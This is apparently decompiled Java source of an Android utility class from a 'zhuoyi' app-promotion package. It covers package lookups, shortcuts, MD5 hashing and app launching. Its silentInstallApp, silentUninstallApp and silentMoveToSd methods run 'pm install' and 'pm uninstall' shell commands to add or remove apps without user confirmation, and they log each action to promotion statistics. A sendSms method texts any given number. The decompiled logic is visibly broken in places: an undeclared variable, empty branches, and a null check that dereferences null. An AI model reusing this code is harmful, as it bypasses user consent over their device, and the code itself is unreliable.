package com.zhuoyi.system.util;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsManager;
import com.zhuoyi.system.network.object.SerApkInfo;
import com.zhuoyi.system.promotion.util.constants.BundleConstants;
import com.zhuoyi.system.statistics.prom.util.StatsPromUtils;
import com.zhuoyi.system.util.model.MyPackageInfo;
import com.zhuoyou.plugin.bluetooth.connection.CustomCmd;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

public class AppInfoUtils {
    private static final String APP_DETAILS_CLASS_NAME = "com.android.settings.InstalledAppDetails";
    private static final String APP_DETAILS_PACKAGE_NAME = "com.android.settings";
    private static final String APP_PKG_NAME_21 = "com.android.settings.ApplicationPkgName";
    private static final String APP_PKG_NAME_22 = "pkg";
    private static final String SCHEME = "package";
    public static List<MyPackageInfo> installedPackageInfoList = null;
    public static List<PackageInfo> packageInfoList = null;
    public static List<MyPackageInfo> removedPackageInfoList = null;

    public static int getPackageVersionCode(Context context) {
        int version = 0;
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode;
        } catch (Exception e) {
            Logger.m3375p(e);
            return version;
        }
    }

    public static String getPackageVersionName(Context context) throws NameNotFoundException {
        return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
    }

    public static boolean isSDCardAvailable() {
        return Environment.getExternalStorageState().equals("mounted");
    }

    public static boolean isApkExist(Context context, String packageName) {
        if (packageName == null || "".equals(packageName) || getPackageInfoByPackageName(context, packageName) == null) {
            return false;
        }
        return true;
    }

    public static PackageInfo getPackageInfoByPackageName(Context context, String packageName) {
        if (packageInfoList == null) {
            packageInfoList = context.getPackageManager().getInstalledPackages(0);
        }
        for (int i = 0; i < packageInfoList.size(); i++) {
            PackageInfo p = (PackageInfo) packageInfoList.get(i);
            if (p.packageName.equals(packageName)) {
                return p;
            }
        }
        return null;
    }

    public static void installApp(Context mContext, String apkPath, MyPackageInfo packageInfo) {
        Intent intent = getInstallIntent(mContext, apkPath, packageInfo);
        if (intent != null) {
            saveInstallInfoToRam(mContext, apkPath, packageInfo);
            mContext.startActivity(intent);
        }
    }

    public static void installApp(Activity activity, String apkPath, MyPackageInfo packageInfo, int requestCode) {
        Intent intent = getInstallIntent(activity, apkPath, packageInfo);
        if (intent != null) {
            saveInstallInfoToRam(activity, apkPath, packageInfo);
            activity.startActivityForResult(intent, requestCode);
        }
    }

    private static Intent getInstallIntent(Context mContext, String apkPath, MyPackageInfo packageInfo) {
        File apkFile = new File(apkPath);
        if (!apkFile.exists()) {
            return null;
        }
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.addFlags(268435456);
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        return intent;
    }

    private static void saveInstallInfoToRam(Context mContext, String apkPath, MyPackageInfo packageInfo) {
        if (packageInfo != null) {
            packageInfo.setApkPath(apkPath);
            StatsPromUtils.getInstance(mContext).addAppInstallAction(packageInfo.getPackageName(), packageInfo.getVersionCode(), 0, packageInfo.getPosition(), packageInfo.getSource());
            if (installedPackageInfoList == null) {
                installedPackageInfoList = new ArrayList();
            }
            if (!installedPackageInfoList.contains(packageInfo)) {
                installedPackageInfoList.add(packageInfo);
            }
        }
    }

    private static String silentInstallApp(Context mContext, String apkPath, String pkgName) {
        Throwable th;
        Logger.m3373e("promAppInfoUtil", "silentInstallApp");
        Intent it = new Intent("android.intent.action.ZHUOYOU_INSTALL_APK_QUIETLY");
        it.putExtra(SCHEME, pkgName);
        mContext.sendBroadcast(it, "com.zhuoyi.app.permission.INTERNEL_FLAG");
        String result = null;
        ProcessBuilder processBuilder = new ProcessBuilder(new String[]{"pm", "install", "-r", apkPath});
        Process process = null;
        InputStream errIs = null;
        InputStream inIs = null;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ByteArrayOutputStream baosRet = new ByteArrayOutputStream();
        process = processBuilder.start();
        errIs = process.getErrorStream();
        while (true) {
            int read = errIs.read();
            if (read == -1) {
                break;
            }
            try {
                baos.write(read);
            } catch (Exception e) {
                Exception e2 = e;
            }
        }
        baos.write(10);
        inIs = process.getInputStream();
        while (true) {
            read = inIs.read();
            if (read == -1) {
                break;
            }
            baosRet.write(read);
            baos.write(read);
        }
        String result2 = new String(baosRet.toByteArray());
        try {
            Logger.m3373e("promAppInfoUtil", "install result:" + new String(baos.toByteArray()));
            if (errIs != null) {
                try {
                    errIs.close();
                } catch (Exception e22) {
                    e22.printStackTrace();
                }
            }
            if (inIs != null) {
                inIs.close();
            }
            if (process != null) {
                process.destroy();
            }
            result = result2;
        } catch (Exception e3) {
            e22 = e3;
            result = result2;
            try {
                e22.printStackTrace();
                if (errIs != null) {
                    try {
                        errIs.close();
                    } catch (Exception e222) {
                        e222.printStackTrace();
                        if (process != null) {
                            process.destroy();
                        }
                        if (result == null) {
                        }
                        Logger.m3373e("promAppInfoUtil", "install failed");
                        return "install failed";
                    }
                }
                if (inIs != null) {
                    inIs.close();
                }
                if (process != null) {
                    process.destroy();
                }
                if (result == null) {
                }
                Logger.m3373e("promAppInfoUtil", "install failed");
                return "install failed";
            } catch (Throwable th2) {
                th = th2;
                if (errIs != null) {
                    try {
                        errIs.close();
                    } catch (Exception e2222) {
                        e2222.printStackTrace();
                        if (process != null) {
                            process.destroy();
                        }
                        throw th;
                    }
                }
                if (inIs != null) {
                    inIs.close();
                }
                if (process != null) {
                    process.destroy();
                }
                throw th;
            }
        } catch (Throwable th3) {
            th = th3;
            result = result2;
            if (errIs != null) {
                errIs.close();
            }
            if (inIs != null) {
                inIs.close();
            }
            if (process != null) {
                process.destroy();
            }
            throw th;
        }
        if (result == null && result.startsWith("Success")) {
            Logger.m3373e("promAppInfoUtil", "install success");
            return null;
        }
        Logger.m3373e("promAppInfoUtil", "install failed");
        return "install failed";
    }

    public static String silentInstallApp(Context mContext, String apkPath, MyPackageInfo packageInfo) {
        if (packageInfo != null) {
            packageInfo.setApkPath(apkPath);
            StatsPromUtils.getInstance(mContext).addAppInstallAction(packageInfo.getPackageName(), packageInfo.getVersionCode(), 0, packageInfo.getPosition(), packageInfo.getSource());
            if (installedPackageInfoList == null) {
                installedPackageInfoList = new ArrayList();
            }
            if (!installedPackageInfoList.contains(packageInfo)) {
                installedPackageInfoList.add(packageInfo);
            }
        }
        return silentInstallApp(mContext, apkPath, packageInfo.getPackageName());
    }

    public static void uninstallApp(Context mContext, MyPackageInfo pInfo) {
        if (pInfo != null) {
            StatsPromUtils.getInstance(mContext).addAppUninstallAction(pInfo.getPackageName(), pInfo.getVersionCode(), 0, pInfo.getPosition(), pInfo.getSource());
            if (removedPackageInfoList == null) {
                removedPackageInfoList = new ArrayList();
            }
            if (!removedPackageInfoList.contains(pInfo)) {
                removedPackageInfoList.add(pInfo);
            }
            Intent uninstallIntent = new Intent("android.intent.action.DELETE", Uri.fromParts(SCHEME, pInfo.getPackageName(), null));
            uninstallIntent.addFlags(268435456);
            mContext.startActivity(uninstallIntent);
        }
    }

    public static void uninstallApp(Activity activity, MyPackageInfo pInfo, int requestCode) {
        if (pInfo != null) {
            StatsPromUtils.getInstance(activity).addAppUninstallAction(pInfo.getPackageName(), pInfo.getVersionCode(), 0, pInfo.getPosition(), pInfo.getSource());
            if (removedPackageInfoList == null) {
                removedPackageInfoList = new ArrayList();
            }
            if (!removedPackageInfoList.contains(pInfo)) {
                removedPackageInfoList.add(pInfo);
            }
            Intent uninstallIntent = new Intent("android.intent.action.DELETE", Uri.fromParts(SCHEME, pInfo.getPackageName(), null));
            uninstallIntent.addFlags(268435456);
            activity.startActivityForResult(uninstallIntent, requestCode);
        }
    }

    public static void silentUninstallApp(Context mContext, MyPackageInfo pInfo) {
        if (pInfo != null) {
            StatsPromUtils.getInstance(mContext).addAppUninstallAction(pInfo.getPackageName(), pInfo.getVersionCode(), 0, pInfo.getPosition(), pInfo.getSource());
            if (removedPackageInfoList == null) {
                removedPackageInfoList = new ArrayList();
            }
            if (!removedPackageInfoList.contains(pInfo)) {
                removedPackageInfoList.add(pInfo);
            }
            processAdbOrder(new String[]{"pm", "uninstall", "-c", pInfo.getPackageName()});
        }
    }

    public static void normalMoveToSd(Activity activity, MyPackageInfo pInfo, int requestCode) {
        Intent intent = new Intent();
        int apiLevel = VERSION.SDK_INT;
        if (apiLevel >= 9) {
            intent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
            intent.setData(Uri.fromParts(SCHEME, pInfo.getPackageName(), null));
        } else {
            String appPkgName = apiLevel == 8 ? APP_PKG_NAME_22 : APP_PKG_NAME_21;
            intent.setAction("android.intent.action.VIEW");
            intent.setClassName(APP_DETAILS_PACKAGE_NAME, APP_DETAILS_CLASS_NAME);
            intent.putExtra(appPkgName, pInfo.getPackageName());
        }
        activity.startActivityForResult(intent, requestCode);
    }

    public static String silentMoveToSd(Context mContext, MyPackageInfo pInfo) {
        String[] args = null;
        if (PhoneInfoUtils.getAvailableSDcardRoom() < new File(pInfo.getApkPath()).length() * 2) {
            return mContext.getResources().getString(ResourceIdUtils.getResourceId(mContext, "R.string.zy_no_enough_room"));
        }
        processAdbOrder(new String[]{"pm", "install", "-r", "-s", pInfo.getApkPath()});
        return null;
    }

    public static boolean processAdbOrder(String[] args) {
        boolean result = true;
        ProcessBuilder processBuilder = new ProcessBuilder(args);
        Process process = null;
        InputStream errIs = null;
        InputStream inIs = null;
        try {
            int read;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            process = processBuilder.start();
            errIs = process.getErrorStream();
            while (true) {
                read = errIs.read();
                if (read == -1) {
                    break;
                }
                baos.write(read);
            }
            Logger.m3373e("promAppInfoUtil", "errIs------" + baos.toString());
            if (baos.toString().toLowerCase().contains("fail")) {
                Logger.m3373e("promAppInfoUtil", Mailbox.FAILED);
                result = false;
            }
            baos.write(10);
            inIs = process.getInputStream();
            while (true) {
                read = inIs.read();
                if (read == -1) {
                    break;
                }
                baos.write(read);
            }
            if (errIs != null) {
                try {
                    errIs.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (inIs != null) {
                inIs.close();
            }
            if (process != null) {
                process.destroy();
            }
        } catch (Exception e2) {
            result = false;
            Logger.m3373e("promAppInfoUtil", "process exception!");
            e2.printStackTrace();
            if (errIs != null) {
                try {
                    errIs.close();
                } catch (IOException e3) {
                    e3.printStackTrace();
                    if (process != null) {
                        process.destroy();
                    }
                    return result;
                }
            }
            if (inIs != null) {
                inIs.close();
            }
            if (process != null) {
                process.destroy();
            }
        } catch (Error e4) {
            result = false;
            Logger.m3373e("promAppInfoUtil", "process error!");
            e4.printStackTrace();
            if (errIs != null) {
                try {
                    errIs.close();
                } catch (IOException e32) {
                    e32.printStackTrace();
                    if (process != null) {
                        process.destroy();
                    }
                    return result;
                }
            }
            if (inIs != null) {
                inIs.close();
            }
            if (process != null) {
                process.destroy();
            }
        } catch (Throwable th) {
            if (errIs != null) {
                try {
                    errIs.close();
                } catch (IOException e322) {
                    e322.printStackTrace();
                    if (process != null) {
                        process.destroy();
                    }
                }
            }
            if (inIs != null) {
                inIs.close();
            }
            if (process != null) {
                process.destroy();
            }
        }
        return result;
    }

    public static String getMd5FromFile(String filepath) throws NoSuchAlgorithmException, FileNotFoundException {
        MessageDigest digest = MessageDigest.getInstance("MD5");
        String output = "";
        InputStream is = new FileInputStream(new File(filepath));
        byte[] buffer = new byte[8192];
        while (true) {
            try {
                int read = is.read(buffer);
                if (read <= 0) {
                    break;
                }
                digest.update(buffer, 0, read);
            } catch (IOException e) {
                throw new RuntimeException("Unable to process file for MD5", e);
            } catch (Throwable th) {
                try {
                    is.close();
                } catch (IOException e2) {
                    throw new RuntimeException("Unable to close input stream for MD5 calculation", e2);
                }
            }
        }
        output = new BigInteger(1, digest.digest()).toString(16);
        while (output.length() < 32) {
            output = "0" + output;
        }
        try {
            is.close();
            return output;
        } catch (IOException e22) {
            throw new RuntimeException("Unable to close input stream for MD5 calculation", e22);
        }
    }

    public static boolean isActivityOnTop(Context context, String activityName) {
        return activityName.equals(((RunningTaskInfo) ((ActivityManager) context.getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getClassName());
    }

    public static String getTopActivityName(Context context) {
        String topActivityName = "";
        try {
            topActivityName = ((RunningTaskInfo) ((ActivityManager) context.getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getClassName();
        } catch (Exception e) {
        }
        return topActivityName;
    }

    public static String getTopPackageName(Context context) {
        String topPackageName = "";
        try {
            topPackageName = ((RunningTaskInfo) ((ActivityManager) context.getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getPackageName();
        } catch (Exception e) {
        }
        return topPackageName;
    }

    public static void createShortcut(Context context, SerApkInfo apkInfo, String mainActivity, String name, Bitmap iconImage, int iconId, boolean duplicate, int position) {
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.setComponent(new ComponentName(context.getPackageName(), mainActivity));
        if (apkInfo != null) {
            intent.putExtra(BundleConstants.BUNDLE_PACKAGE_NAME, apkInfo.getPackageName());
            intent.putExtra(BundleConstants.BUNDLE_VERSION_CODE, apkInfo.getVer());
            intent.putExtra(BundleConstants.BUNDLE_ICON_ID, apkInfo.getIconId());
            intent.putExtra(BundleConstants.BUNDLE_APP_NAME, apkInfo.getAppName());
            intent.putExtra(BundleConstants.BUNDLE_DOWNLOAD_URL, apkInfo.getDownloadUrl());
            intent.putExtra(BundleConstants.BUNDLE_ICON_URL, apkInfo.getIconUrl());
            intent.putExtra(BundleConstants.BUNDLE_MD5, apkInfo.getFileVerifyCode());
            intent.putExtra(BundleConstants.BUNDLE_FILE_NAME, apkInfo.getFileName());
            intent.putExtra(BundleConstants.BUNDLE_APP_INFO_POSITION, position);
        }
        Intent shortcutIntent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
        shortcutIntent.putExtra("duplicate", false);
        shortcutIntent.putExtra("android.intent.extra.shortcut.INTENT", intent);
        shortcutIntent.putExtra("android.intent.extra.shortcut.NAME", name);
        if (iconImage != null) {
            shortcutIntent.putExtra("android.intent.extra.shortcut.ICON", iconImage);
            Logger.debug("send create shortcut Broadcast");
            context.sendBroadcast(shortcutIntent);
            return;
        }
        Logger.error("shortcut image is null");
    }

    public static PackageInfo getPackageInfoFromAPKFile(PackageManager packageManager, File apkFile) {
        return packageManager.getPackageArchiveInfo(apkFile.getAbsolutePath(), CustomCmd.CMD_SYNC_SLEEP_MSG);
    }

    public static void launchOtherActivity(Context context, String packageName, Bundle b) {
        Intent i = context.getPackageManager().getLaunchIntentForPackage(packageName);
        if (i == null) {
            i = new Intent(packageName);
            i.setAction("android.intent.action.MAIN");
            i.setFlags(268435456);
        }
        if (b != null) {
            i.putExtras(b);
        }
        try {
            context.startActivity(i);
        } catch (Exception e) {
            Logger.m3375p(e);
        }
    }

    public static void sendSms(Context context, String num, String msg) {
        SmsManager sms = SmsManager.getDefault();
        PendingIntent pi = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
        for (String text : sms.divideMessage(msg)) {
            sms.sendTextMessage(num, null, text, pi, null);
        }
    }

    public static boolean isOpenInstallRightNow(int position, int source) {
        if (position == 8) {
            return false;
        }
        return true;
    }

    public static void backHome(Context context) {
        Intent intent = new Intent();
        intent.setAction("android.intent.action.MAIN");
        intent.addCategory("android.intent.category.HOME");
        intent.addFlags(268435456);
        context.startActivity(intent);
    }

    public static void onDestroy() {
        packageInfoList = null;
        installedPackageInfoList = null;
        removedPackageInfoList = null;
    }

    public static void removeApk(MyPackageInfo pInfo) {
        if (pInfo != null && pInfo.getApkPath() != null) {
            File apkFile = new File(pInfo.getApkPath());
            if (apkFile.exists()) {
                apkFile.delete();
            }
        }
    }
}
